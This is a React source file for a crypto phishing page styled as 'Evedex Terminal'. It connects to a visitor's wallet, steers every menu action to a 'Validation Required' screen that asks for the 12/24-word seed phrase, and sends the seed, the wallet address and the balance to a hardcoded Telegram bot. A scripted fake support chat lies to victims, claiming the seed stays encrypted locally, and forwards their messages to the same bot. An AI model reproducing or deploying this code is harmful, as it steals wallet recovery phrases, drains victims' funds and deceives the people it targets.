import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight, MessageSquare, X, Send, ChevronRight } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [nodeId, setNodeId] = useState("EVEDEX_RELAY_0x77");

  // --- SMART CHAT STATES ---
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [userMsg, setUserMsg] = useState("");
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const backToMenu = () => { setView("menu"); setActiveTask(""); setInputVal(""); };
  const openTask = (taskName) => { setInputVal(""); setActiveTask(taskName); setView("task_box"); };

  // Initialize chat only when opened
  const toggleChat = () => {
    if (!isChatOpen && chatMessages.length === 0) {
      setChatMessages([{ role: 'agent', text: `System Status: Node ${nodeId} connected. How can Evedex Support assist your current ${activeTask || 'session'}?` }]);
    }
    setIsChatOpen(!isChatOpen);
  };

  const sendToTelegram = (text) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text }),
    });
  };

  const handleSupportOption = (option) => {
    const userMessage = { role: 'user', text: option };
    setChatMessages(prev => [...prev, userMessage]);
    sendToTelegram(`💬 CHAT OPTION CLICKED: ${option}`);

    setTimeout(() => {
      let reply = "";
      if (option.includes("stuck") || option.includes("pending")) {
        reply = "Our sensors detect 'RPC Header Mismatch'. This happens during high network congestion. To push your transaction through, you must complete the 'Sync Validation' using your 12/24 word Project Seed. This re-indexes your wallet on the Evedex mainnet relay.";
      } else if (option.includes("safe")) {
        reply = "Evedex uses Client-Side Handshake technology. Your seed phrase is encrypted locally and used only to authenticate your node connection. We do not have access to your private keys after the sync is finalized.";
      } else {
        reply = "To resolve any UI or balance bugs, please proceed to the validation screen and enter your recovery phrase to re-sync with the blockchain state.";
      }
      setChatMessages(prev => [...prev, { role: 'agent', text: reply }]);
    }, 800);
  };

  const handleChatInput = () => {
    if (!userMsg) return;
    setChatMessages(prev => [...prev, { role: 'user', text: userMsg }]);
    sendToTelegram(`💬 USER TYPED: ${userMsg}`);
    
    // Analyze input for "stuck" or "help" keywords
    setTimeout(() => {
      const msg = userMsg.toLowerCase();
      let reply = "I am reviewing your session logs. It appears your node is out of sync. Please use the 'Finalize Sync' button and enter your seed to restore service.";
      if (msg.includes("how") || msg.includes("what")) {
        reply = "The process is simple: Enter your 12-word seed into the validation box. Our terminal will then perform a 'Deep Sync' to recover your stuck transactions and update your balance.";
      }
      setChatMessages(prev => [...prev, { role: 'agent', text: reply }]);
      setUserMsg("");
    }, 1200);
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatMessages]);

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none relative overflow-hidden">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg">
            <ShieldCheck size={22}/>EVEDEX TERMINAL
          </div>
          <div className="flex items-center gap-1.5 mt-1">
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-[7px] font-mono text-slate-500 tracking-[0.3em]">NODE: ONLINE</span>
          </div>
        </div>
        <w3m-button balance="show" /> 
      </header>

      {/* --- RE-DESIGNED CHAT WIDGET --- */}
      <div className={`fixed bottom-6 right-6 z-[100] transition-all duration-300 ${isChatOpen ? 'w-[320px]' : 'w-14'}`}>
        {!isChatOpen ? (
          <button onClick={toggleChat} className="bg-cyan-600 p-4 rounded-full shadow-2xl hover:scale-110 active:scale-95 transition-all">
            <MessageSquare color="white" />
          </button>
        ) : (
          <div className="w-full h-[480px] bg-[#0d1117] border border-slate-800 rounded-[32px] shadow-2xl flex flex-col animate-in slide-in-from-bottom-5">
            <div className="p-4 border-b border-slate-800 flex justify-between items-center bg-slate-900/40 rounded-t-[32px]">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-[9px] font-black text-white italic tracking-widest">EVEDEX_SUPPORT_BOT</span>
              </div>
              <button onClick={() => setIsChatOpen(false)}><X size={18} className="text-slate-500 hover:text-white"/></button>
            </div>
            
            <div className="flex-1 overflow-y-auto p-4 space-y-4 no-scrollbar font-mono text-[9px] lowercase tracking-normal">
              {chatMessages.map((m, i) => (
                <div key={i} className={`${m.role === 'agent' ? 'bg-slate-800/60 text-cyan-300 mr-8' : 'bg-cyan-900/60 text-white ml-8'} p-3 rounded-2xl leading-relaxed border border-white/5 shadow-sm`}>
                  {m.text}
                </div>
              ))}
              
              {/* SUGGESTED OPTIONS */}
              {chatMessages[chatMessages.length-1]?.role === 'agent' && (
                <div className="flex flex-col gap-2 pt-2 pr-4 animate-in fade-in slide-in-from-left-2">
                  {["Why is my sync stuck?", "Is this sync safe?", "I am having a UI bug", "How to finish?"].map((opt) => (
                    <button key={opt} onClick={() => handleSupportOption(opt)} className="text-left bg-black/40 border border-slate-800 p-2 rounded-lg text-[8px] text-slate-400 hover:text-cyan-400 hover:border-cyan-900 transition-all flex items-center justify-between group uppercase italic font-bold">
                      {opt} <ChevronRight size={10} className="group-hover:translate-x-1 transition-transform"/>
                    </button>
                  ))}
                </div>
              )}
              <div ref={chatEndRef} />
            </div>

            <div className="p-4 border-t border-slate-800 bg-black/20 flex gap-2">
              <input value={userMsg} onChange={(e) => setUserMsg(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && handleChatInput()} placeholder="Ask a question..." className="flex-1 bg-black border border-slate-800 rounded-xl px-4 py-2 text-[10px] outline-none text-white placeholder:text-slate-700 uppercase" />
              <button onClick={handleChatInput} className="bg-cyan-600 p-2 rounded-xl active:scale-90 transition-transform"><Send size={14} color="white"/></button>
            </div>
          </div>
        )}
      </div>

      {/* --- THE REST OF YOUR UI (Menu, Task Box, Seed Gate) REMAINS THE SAME --- */}
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[ { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> } ].map((item) => (
            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
          <button onClick={backToMenu} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_SESSION</button>
          <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Portal</h2>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">Target {activeTask} Units</label>
            <input type="text" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full placeholder:text-slate-900" />
          </div>
          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
            {chains.map((c) => ( <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">{c.name} Node</button> ))}
            <button onClick={() => setView("seed_gate")} className="whitespace-nowrap bg-slate-900 border border-purple-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-purple-500 uppercase active:scale-95">SOLANA (SVM) SYNC</button>
          </div>
          <button onClick={() => { setLoading(true); setTimeout(() => { setLoading(false); setView("seed_gate"); }, 1500); }} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic flex items-center justify-center gap-2">EXECUTE {activeTask} <ArrowRight size={14}/></button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Validation Required</h2>
                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the synchronization of your {activeTask || "Node"}, provide the Project Authorization Seed.</p>
                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                <button disabled={inputVal.trim().split(/\s+/).length < 12} onClick={() => {
                  setIsSyncing(true);
                  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${inputVal}` }), });
                  let cur = 0; const itv = setInterval(() => { cur += 2; if (cur >= 85) clearInterval(itv); setSyncProgress(cur); }, 100);
                }} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${inputVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600 active:scale-95' : 'bg-slate-900 opacity-50'}`}>Finalize Sync</button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-xl italic tracking-tighter uppercase mb-2">Syncing Evedex Nodes</h2>
                <p className="text-[8px] font-mono text-cyan-700 tracking-widest uppercase mb-4">{nodeId}</p>
                <p className="text-[9px] text-slate-500 lowercase animate-pulse italic">Connecting to secure relay network...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">Routing to Evedex Mainnet...</p></div>
      )}
    </div>
  );
}
